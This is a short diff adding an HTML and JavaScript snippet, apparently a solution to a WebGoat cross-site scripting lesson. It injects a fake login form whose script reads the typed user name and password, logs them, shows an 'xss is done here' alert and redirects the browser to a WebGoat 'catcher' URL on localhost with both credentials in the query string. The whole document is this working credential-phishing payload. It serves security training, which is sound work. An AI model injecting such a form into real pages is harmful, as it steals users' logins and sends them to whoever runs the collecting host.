@@ -1,0 +1,21 @@
+<script type = "text/javascript">
+	
+	function myFunction(){
+		var userValue = document.getElementById("userid").value;
+		var passwordValue = document.getElementById("passwordid").value;
+		
+		console.log("userValue is " + userValue);
+		console.log("passwordValue is " + passwordValue);
+		alert('xss is done here');
+		window.location.href = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&user='+ userValue + '&password=' + passwordValue;
+	}
+</script>
+
+<form>
+	<br>
+	User value:
+	<input type="text" name="userid" id = "userid"><br>
+	Password value:
+	<input type="text" name="passwordid" id = "passwordid"><br>	
+	<button onclick="myFunction()">Click Me!</button>
+</form>
